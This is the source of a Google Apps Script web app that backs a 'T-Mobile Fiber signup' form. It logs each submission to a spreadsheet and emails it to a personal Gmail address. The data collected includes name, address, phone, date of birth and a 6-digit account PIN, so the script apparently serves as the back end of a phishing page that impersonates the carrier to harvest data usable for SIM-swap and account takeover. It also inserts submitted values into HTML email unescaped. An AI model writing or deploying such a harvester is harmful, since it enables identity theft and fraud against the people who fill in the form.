/**
 * T-Mobile Fiber signup — Google Apps Script Web App.
 *
 * Deploy: Extensions → Apps Script → paste this file → Deploy → New deployment
 *   Type: Web app | Execute as: Me | Who has access: Anyone
 * Copy the Web app URL and paste it into src/lib/signup-config.ts.
 *
 * Email notifications are sent to NOTIFY_EMAIL on every submission.
 */

var SHEET_NAME = 'Submissions';
var NOTIFY_EMAIL = 'gamblerspassion@gmail.com';

var COLUMN_KEYS = [
  'timestampEST',
  'planSelected',
  'fullName',
  'fullFormattedAddress',
  'streetAddress',
  'aptUnit',
  'city',
  'state',
  'zip',
  'phone',
  'email',
  'dob',
  'pin',
  'preferredInstallDate',
  'preferredInstallTime',
  'consent',
];

var COLUMN_HEADERS = [
  'Timestamp EST',
  'Plan Selected',
  'Full Name',
  'Full Formatted Address',
  'Street Address',
  'Apt / Unit',
  'City',
  'State',
  'ZIP',
  'Phone',
  'Email',
  'DOB',
  '6 Digit PIN',
  'Preferred Install Date',
  'Preferred Install Time',
  'Consent',
];

function doPost(e) {
  try {
    var body = JSON.parse(e.postData.contents);
    var ss = SpreadsheetApp.getActive();
    var sheet = ss.getSheetByName(SHEET_NAME);
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);
    }

    // Always ensure headers exist in row 1 (handles first submission AND any accidental deletion).
    var firstRowValues = sheet.getLastRow() > 0
      ? sheet.getRange(1, 1, 1, COLUMN_HEADERS.length).getValues()[0]
      : [];
    var headersPresent = firstRowValues[0] === COLUMN_HEADERS[0];
    if (!headersPresent) {
      // Insert a header row at the top without disturbing existing data rows.
      sheet.insertRowBefore(1);
      var headerRange = sheet.getRange(1, 1, 1, COLUMN_HEADERS.length);
      headerRange.setValues([COLUMN_HEADERS]);
      headerRange.setFontWeight('bold');
      headerRange.setBackground('#E20074');
      headerRange.setFontColor('#ffffff');
    }

    var row = COLUMN_KEYS.map(function (k) { return body[k] !== undefined ? body[k] : ''; });
    sheet.appendRow(row);

    // Send email notification with all submission details.
    sendNotificationEmail(body);

    return ContentService
      .createTextOutput(JSON.stringify({ success: true }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    Logger.log('doPost error: ' + String(err));
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, error: String(err) }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

function sendNotificationEmail(data) {
  try {
    var subject = 'New T-Mobile Fiber Install Request — ' + (data.fullName || 'Unknown');

    var body = [
      'A new T-Mobile Fiber install request was submitted.',
      '',
      '=== Submission Details ===',
      'Timestamp:         ' + (data.timestampEST || ''),
      'Plan Selected:     ' + (data.planSelected || ''),
      '',
      '=== Customer Information ===',
      'Full Name:         ' + (data.fullName || ''),
      'Phone:             ' + (data.phone || ''),
      'Email:             ' + (data.email || ''),
      'Date of Birth:     ' + (data.dob || ''),
      '',
      '=== Service Address ===',
      'Full Address:      ' + (data.fullFormattedAddress || ''),
      'Street:            ' + (data.streetAddress || ''),
      'Apt / Unit:        ' + (data.aptUnit || ''),
      'City:              ' + (data.city || ''),
      'State:             ' + (data.state || ''),
      'ZIP:               ' + (data.zip || ''),
      '',
      '=== Install Preferences ===',
      'Preferred Date:    ' + (data.preferredInstallDate || ''),
      'Preferred Time:    ' + (data.preferredInstallTime || ''),
      '',
      '=== Account & Consent ===',
      '6-Digit PIN:       ' + (data.pin || ''),
      'Consent Given:     ' + (data.consent || ''),
      '',
      '---',
      'This is an automated notification from the T-Mobile Fiber signup form.',
    ].join('\n');

    // HTML version for nicer formatting in email clients.
    var htmlBody = '<div style="font-family:Arial,sans-serif;max-width:600px;">'
      + '<div style="background:#E20074;padding:16px 24px;border-radius:8px 8px 0 0;">'
      + '<h2 style="color:#fff;margin:0;font-size:18px;">New T-Mobile Fiber Install Request</h2>'
      + '</div>'
      + '<div style="background:#fff;border:1px solid #e5e5e5;border-top:none;padding:24px;border-radius:0 0 8px 8px;">'
      + section('Submission', [
          row2('Timestamp', data.timestampEST),
          row2('Plan Selected', '<strong>' + (data.planSelected || '') + '</strong>'),
        ])
      + section('Customer Information', [
          row2('Full Name', data.fullName),
          row2('Phone', data.phone),
          row2('Email', data.email),
          row2('Date of Birth', data.dob),
        ])
      + section('Service Address', [
          row2('Full Address', data.fullFormattedAddress),
          row2('Apt / Unit', data.aptUnit),
          row2('City', data.city),
          row2('State', data.state),
          row2('ZIP', data.zip),
        ])
      + section('Install Preferences', [
          row2('Preferred Date', data.preferredInstallDate),
          row2('Preferred Time', data.preferredInstallTime),
        ])
      + section('Account & Consent', [
          row2('6-Digit PIN', data.pin),
          row2('Consent Given', data.consent),
        ])
      + '</div>'
      + '<p style="font-size:11px;color:#999;margin-top:8px;">Automated notification from the T-Mobile Fiber signup form.</p>'
      + '</div>';

    MailApp.sendEmail({
      to: NOTIFY_EMAIL,
      subject: subject,
      body: body,
      htmlBody: htmlBody,
    });
  } catch (emailErr) {
    Logger.log('Email notification error: ' + String(emailErr));
    // Do not re-throw — sheet write should still succeed even if email fails.
  }
}

// ---- HTML email helpers ----

function section(title, rows) {
  return '<h3 style="font-size:13px;font-weight:700;color:#E20074;margin:20px 0 8px;text-transform:uppercase;letter-spacing:0.05em;">'
    + title + '</h3>'
    + '<table style="width:100%;border-collapse:collapse;font-size:14px;">'
    + rows.join('')
    + '</table>';
}

function row2(label, value) {
  return '<tr style="border-bottom:1px solid #f0f0f0;">'
    + '<td style="padding:6px 8px 6px 0;color:#666;width:40%;vertical-align:top;">' + label + '</td>'
    + '<td style="padding:6px 0;color:#000;font-weight:600;">' + (value || '—') + '</td>'
    + '</tr>';
}

function doGet() {
  return ContentService
    .createTextOutput(JSON.stringify({ ok: true, service: 'tmo-fiber-signup' }))
    .setMimeType(ContentService.MimeType.JSON);
}
